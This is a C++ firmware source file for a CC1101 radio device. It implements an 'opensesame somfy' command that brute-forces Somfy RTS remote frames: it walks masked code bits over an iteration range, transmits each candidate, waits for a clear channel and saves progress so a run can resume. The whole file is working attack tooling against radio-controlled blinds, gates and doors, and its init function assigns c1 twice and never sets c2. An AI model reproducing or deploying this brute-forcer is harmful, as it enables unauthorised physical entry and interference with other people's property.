//------------------------------------------------------------------------------------------------------------------
#include "settings.h"
#include "Processor.h"
#include "Protocol.h"
#include "ev1527_protocol.h"
#include "hcs200_protocol.h"
#include "somfy_protocol.h"
//------------------------------------------------------------------------------------------------------------------
#include "CmdHandler.h"
#include "radio_profile.h"
#include "radio_pulses.h"
#include "utils.h"
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_main(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setcode(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setmask(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setibds(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_setirangea(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_processr(void* parent,int argc, char* argv[]);
CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[]);
CmdHandler* getRootCommandHandler(void);
CC1101* getRadio(void);
#if USE_FILE_SYSTEM == 1
CmdStatus_e files_write_int(void* parent, const char *fname, const char* buffer, const char* openmode);
#endif
//------------------------------------------------------------------------------------------------------------------
extern SomfyRTSProtocol somfy;
Protocol* osprots[] = { &somfy };
//------------------------------------------------------------------------------------------------------------------
typedef struct SomfyBruteContext_s
{
    uint32_t c0,c1,c2;
    uint32_t c0msk,c1msk,c2msk;
    uint64_t itstart;
    uint64_t itend;
    uint64_t curr;
    uint8_t bit_spread_strategy;
    bool cont;
    bool use_rssi;
    int rssi;
    int rssi_wait_ms;

} SomfyBruteContext_t;
//------------------------------------------------------------------------------------------------------------------
SomfyBruteContext_t somfy_ctx;
//------------------------------------------------------------------------------------------------------------------
cmd_handler_t open_sesame_handler = { &open_sesame_main, NULL, NULL, "opensesame", "Open sesame for various radio protocols, use: 'opensesame help'", 0, "", "opensesame help" };
//------------------------------------------------------------------------------------------------------------------
cmd_handler_t open_sesame_sub_cmd[] = {
   { &open_sesame_main,      &open_sesame_handler,   NULL, "help",  "this help", 0, "", "opensesame help"},
   { &open_sesame_somfy,     &open_sesame_handler,   NULL, "somfy",  "somfy iterated frames flood", 0, "", "opensesame somfy help"},
   { 0,  0, NULL, "",  "", 0, "","" }
};
//------------------------------------------------------------------------------------------------------------------
cmd_handler_t open_sesame_somfy_sub_cmd[] = {
   { &open_sesame_somfy_help,      &open_sesame_handler, NULL, "help", "this help", 0, "", "opensesame somfy help"},
   { &open_sesame_somfy_setcode,   &open_sesame_handler, NULL, "scod", "set codes c0<32bit hex> c1<32bit hex> c2<432bit hex>", 3, "xxx", "opensesame somfy scod 09800000 00000000 ffea8000"},
   { &open_sesame_somfy_setmask,   &open_sesame_handler, NULL, "smsk", "set iteration mask c0msk<hex> c1msk<hex> c2msk<hex>", 3, "xxx", "opensesame somfy smsk 007FFFFF FFFFFFFF 00070000"},
   { &open_sesame_somfy_setirange, &open_sesame_handler, NULL, "sir",  "set iteration range start_hi<hex> start_lo<hex> end_hi<hex> end_lo<hex>", 4, "xxxx", "opensesame somfy sir 00000000 00000000 FFFFFFFF FFFFFFFF"},
   { &open_sesame_somfy_setirangea, &open_sesame_handler, NULL, "sira",  "set auto iteration, set mask first", 0, "", "opensesame somfy sira"},
   { &open_sesame_somfy_setibds,   &open_sesame_handler, NULL, "sibds",  "set iteration bit dispersion strategy: 0 - none, 1 - assymetric, 2 - quad-asssymetric", 1, "i", "opensesame somfy sibds 1"},
   { &open_sesame_somfy_process  , &open_sesame_handler, NULL, "brute", "brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brute 10000<int ms>"},
   { &open_sesame_somfy_processr , &open_sesame_handler, NULL, "brutr", "brute iteration of codes, display interval<int> minrssi<i>, if rssi > minrssi then wait for clear channel, wait after rssi detected <int> ms", 3, "isi", "opensesame somfy brute 10000<int ms> -60<int> 1000<int ms>"},
   { &open_sesame_somfy_cont     , &open_sesame_handler, NULL, "brutc", "continue brute iteration of codes, display interval<int>", 1, "i", "opensesame somfy brutc 10000<int ms>"},
   { 0,  0, NULL, "",  "", 0, "","" }
};
//------------------------------------------------------------------------------------------------------------------
void opensesame_cmd_init(void)
{ 
  open_sesame_sub_cmd[1].sub_cmd = open_sesame_somfy_sub_cmd;
  getRootCommandHandler()->registerHandler(&open_sesame_handler, open_sesame_sub_cmd); 
  somfy_ctx.c0 = 0x09800000;
  somfy_ctx.c1 = 0x00000000;
  somfy_ctx.c1 = 0xffea8000;
  somfy_ctx.cont = false;
  somfy_ctx.use_rssi = false;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_main(void* parent,int argc, char* argv[])
{
     STDOUT.println(open_sesame_handler.desc);

     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_handler.sub_cmd[idx];
     while (item && item->handler != 0)
     {
            STDOUT.print("- ");
            STDOUT.print(item->cmd);
            STDOUT.print( " : ");
            STDOUT.println( item->desc);

            idx++;
            item = &open_sesame_handler.sub_cmd[idx];
      
     }
    
     return OK;
}

//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy(void* parent,int argc, char* argv[])
{
     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_somfy_sub_cmd[idx];

     if (argc < 3)
        return open_sesame_somfy_help(parent, argc, argv);
     
     while (item && item->handler != 0)
     {
            if (String(argv[2]) == item->cmd)
            {
                return item->handler(getRootCommandHandler(), argc, argv);
            }
            idx++;
            item = &open_sesame_somfy_sub_cmd[idx];
      
     }
    
     return COMMAND_NOT_FOUND;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_help(void* parent,int argc, char* argv[])
{
     STDOUT.println(open_sesame_sub_cmd[2].desc);

     int idx = 0 ;
     cmd_handler_t* item = &open_sesame_somfy_sub_cmd[idx];
     while (item && item->handler != 0)
     {
            STDOUT.print("- ");
            STDOUT.print(item->cmd);
            STDOUT.print( " : ");
            STDOUT.println( item->desc);

            idx++;
            item = &open_sesame_somfy_sub_cmd[idx];
      
     }
    
     return OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setcode(void* parent,int argc, char* argv[])
{
   uint32_t c0 = strtoul(argv[3], 0, 16);
   uint32_t c1 = strtoul(argv[4], 0, 16);      
   uint32_t c2 = strtoul(argv[5], 0, 16);    
   
   somfy_ctx.c0 = c0;
   somfy_ctx.c1 = c1;
   somfy_ctx.c2 = c2;
   somfy_ctx.use_rssi = false;

   if (c0 == 0 || c2 == 0)
       return WRONG_PARAMS;
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setmask(void* parent,int argc, char* argv[])
{
   uint32_t code0msk = strtoul(argv[3], 0, 16);
   uint32_t code1msk = strtoul(argv[4], 0, 16);      
   uint32_t code2msk = strtoul(argv[5], 0, 16);
   
   somfy_ctx.c0msk = code0msk;
   somfy_ctx.c1msk = code1msk;
   somfy_ctx.c2msk = code2msk;
    
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setirange(void* parent,int argc, char* argv[])
{
   uint32_t v1 = strtoul(argv[3], 0, 16);
   uint32_t v2 = strtoul(argv[4], 0, 16);   
   uint32_t v3 = strtoul(argv[5], 0, 16);
   uint32_t v4 = strtoul(argv[6], 0, 16);  
   
   somfy_ctx.itstart = v1;
   somfy_ctx.itstart |= (uint64_t)((uint64_t)v2 << 32); 
   somfy_ctx.itend =  v3;
   somfy_ctx.itend |= (uint64_t)((uint64_t)v4 << 32);
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setibds(void* parent,int argc, char* argv[])
{
  int strategy = atoi(argv[3]);
  if (strategy < 0 || strategy > 2)
     return WRONG_PARAMS;

  somfy_ctx.bit_spread_strategy = strategy;
  return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_setirangea(void* parent,int argc, char* argv[])
{

   if (somfy_ctx.c0msk ==0 && somfy_ctx.c1msk == 0 && somfy_ctx.c2msk == 0)
   {
       CmdHandler* handler = (CmdHandler*) parent;
       handler->setHint("Set iteration mask first , smsk");
       return WRONG_PARAMS;
   }

   uint32_t cnt = count_bits_set_uint32(somfy_ctx.c0msk);
   cnt += count_bits_set_uint32(somfy_ctx.c1msk);
   cnt += count_bits_set_uint32(somfy_ctx.c2msk);
   
   somfy_ctx.itstart = 0;
    
   somfy_ctx.itend =  bitscount_to_max_uint64(cnt);
   
   return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
String open_sesame_somfy_ctx_describe(uint32_t c0, uint32_t c1, uint32_t c2, struct SomfyBruteContext_s& ctx, uint32_t startMs)
{
     char buffer[128];
     sprintf(buffer, "cnt:%08x%08x c0: %08x c1: %08x c2: %08x ts:%s", 
        (uint32_t)(ctx.curr >> 32) & 0xffffffff, (uint32_t)(ctx.curr) & 0xffffffff,
        c0, c1, c2, millis_to_time(millis() - startMs).c_str());

     return String(buffer);
    
}

//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_processr(void* parent,int argc, char* argv[])
{
    uint32_t disp = atoi(argv[3]);
    
    int rssi = atoi(argv[4]);

    int wait_after_rssi = atoi(argv[5]);
    
    if (disp == 0 || disp < 2000 || disp > 360000)
    {
         getRootCommandHandler()->setResultMessage("wrong display period");
         return WRONG_PARAMS;
    }
    if (rssi < -100 || rssi > 100)
    {
        getRootCommandHandler()->setResultMessage("wrong rssi <-100,100>");
        return WRONG_PARAMS;
    }

    if (wait_after_rssi < 0 || wait_after_rssi > 10000)
    {
        getRootCommandHandler()->setResultMessage("wrong time after channel occupied");
        return WRONG_PARAMS;
    }

        
   somfy_ctx.use_rssi = true;
   somfy_ctx.rssi = rssi;
   somfy_ctx.rssi_wait_ms = wait_after_rssi;


   return open_sesame_somfy_process(parent, argc, argv);
}    
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_process(void* parent,int argc, char* argv[])
{
    uint32_t disp = atoi(argv[3]);
    bool cont = true;
    String msg;
    uint32_t c0;
    uint32_t c1;
    uint32_t c2;
    int pulses;
    int p;
    char buff[64];
    
    if (disp == 0 || disp < 2000 || disp > 360000)
    {
         getRootCommandHandler()->setResultMessage("wrong display period");
         return WRONG_PARAMS;
    }
    
    if (somfy_ctx.c0 == 0 || somfy_ctx.c2 == 0)
    {
         getRootCommandHandler()->setResultMessage("check c0, c2 codes");
         return WRONG_PARAMS;
    }
    if (somfy_ctx.itend <= somfy_ctx.itstart)
    {
         getRootCommandHandler()->setResultMessage("wrong start end range");
         return WRONG_PARAMS;
    }
    if (somfy_ctx.c0msk == 0 && somfy_ctx.c1msk == 0 && somfy_ctx.c2msk ==0)
    {
         getRootCommandHandler()->setResultMessage("wrong mask for code1,code2,code3");
         return WRONG_PARAMS;
    } 
    
    STDOUT.print("brute start\n\r");
    STDOUT.print("proto:");
    STDOUT.print(somfy.getName().c_str());
    STDOUT.print(" c0:");print_hex_uint32(STDOUT, somfy_ctx.c0);
    STDOUT.print(" c1:");print_hex_uint32(STDOUT, somfy_ctx.c1);
    STDOUT.print(" c2:");print_hex_uint32(STDOUT, somfy_ctx.c2);
    STDOUT.print("\n\r");
    STDOUT.print(" code1msk:");print_hex_uint32(STDOUT, somfy_ctx.c0msk);
    STDOUT.print(" code2msk:");print_hex_uint32(STDOUT, somfy_ctx.c1msk);
    STDOUT.print(" code3msk:");print_hex_uint32(STDOUT, somfy_ctx.c2msk);
    STDOUT.print(" start:");print_hex_uint64(STDOUT, somfy_ctx.itstart); 
    STDOUT.print(" end:");print_hex_uint64(STDOUT, somfy_ctx.itend);
    STDOUT.print("\n\r");
    STDOUT.println(" press ctrl-c/f/d to terminate...");


    if (!somfy_ctx.cont)
        somfy_ctx.curr = somfy_ctx.itstart;
    else
        somfy_ctx.cont = false;

    uint32_t startMs = millis();
    uint32_t s = startMs;
    
    uint32_t bitLen = count_bits_set_uint32(somfy_ctx.c0msk);
    bitLen += count_bits_set_uint32(somfy_ctx.c1msk);
    bitLen += count_bits_set_uint32(somfy_ctx.c2msk);
    
    while(somfy_ctx.curr <= somfy_ctx.itend && cont)
    {
       c0 = somfy_ctx.c0;
       c1 = somfy_ctx.c1;
       c2 = somfy_ctx.c2;

       uint64_t v;

       if (somfy_ctx.bit_spread_strategy == 0)
           v = somfy_ctx.curr;
       else if (somfy_ctx.bit_spread_strategy == 1)
           v = bit_spread_assymetric(somfy_ctx.curr, bitLen);          
       else if (somfy_ctx.bit_spread_strategy == 2)
           v = bit_spread_quad_assymetric(somfy_ctx.curr, bitLen);
           
       apply_value_to_bitmask(&c0, &c1, &c2, somfy_ctx.c0msk,somfy_ctx.c1msk,somfy_ctx.c2msk, v);
       
       somfy.setCodes(c0, c1, c2);

       radio_pulses_flush();


       pulses = 0;
       somfy.toPulses(radio_pulses_get_pulses(), radio_pulses_max_count(), &p, 0);       
       pulses += p;
       somfy.toPulses(&radio_pulses_get_pulses()[pulses], radio_pulses_max_count() - pulses, &p, 1);
       pulses += p;

       if(somfy_ctx.use_rssi)
       {
          bool printMark = false;
          uint32_t rs = millis();
          
          while (getRadio()->getRSSI() >= somfy_ctx.rssi && millis() -rs < somfy_ctx.rssi_wait_ms)
          {
             if(!printMark)
             {    
                  printMark = true;
                  STDOUT.print("wait clear channel\n\r");
             }
             delayMicroseconds(1000 * somfy_ctx.rssi_wait_ms);
          }
       }
       
       radio_pulses_send(0, pulses);
       
       if (millis() -s > disp)
       {
           msg = "brut tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx, startMs);
           STDOUT.print(msg); STDOUT.print("\n\r");
           s = millis();
       }

       somfy_ctx.curr++;
       #if USE_FILE_SYSTEM == 1
       if (somfy_ctx.curr  > 0 && somfy_ctx.curr % OS_ITERATION_FILE_AUTO_DUMP == 0)
       {
            sprintf(buff, "%08x%08x", (uint32_t)((somfy_ctx.curr  >> 32) & 0xffffffff), (uint32_t)(somfy_ctx.curr & 0xffffffff));
            files_write_int(parent, "/os_somfy.txt", buff, "w");      
       }
       #endif
      
       if (STDIN.available() > 0)
       {
          byte c = STDIN.read();
          
          if (c == CTRL_C || c == CTRL_F || c == CTRL_D)
          {
              cont = false;
              continue;
          }
       }
    }
    #if USE_FILE_SYSTEM == 1
    //store last counter
    sprintf(buff, "%08x%08x", (uint32_t)((somfy_ctx.curr  >> 32) & 0xffffffff), (uint32_t)(somfy_ctx.curr & 0xffffffff));
    files_write_int(parent, "/os_somfy.txt", buff, "w");
    #endif
    msg = "brut last tx:" + open_sesame_somfy_ctx_describe(c0,c1,c2,somfy_ctx, startMs);
    STDOUT.print(msg); STDOUT.print("\n\r");
    STDOUT.print("brute stop\n\r");
    

    return CmdStatus_e::OK;
}
//------------------------------------------------------------------------------------------------------------------
CmdStatus_e open_sesame_somfy_cont(void* parent,int argc, char* argv[])
{
    uint32_t disp = atoi(argv[3]);
    
    if (disp == 0 || disp < 2000 || disp > 360000)
    {
         getRootCommandHandler()->setResultMessage("wrong display period");
         return WRONG_PARAMS;
    }

    somfy_ctx.cont = true;

    return open_sesame_somfy_process(parent, argc, argv);
}
//------------------------------------------------------------------------------------------------------------------
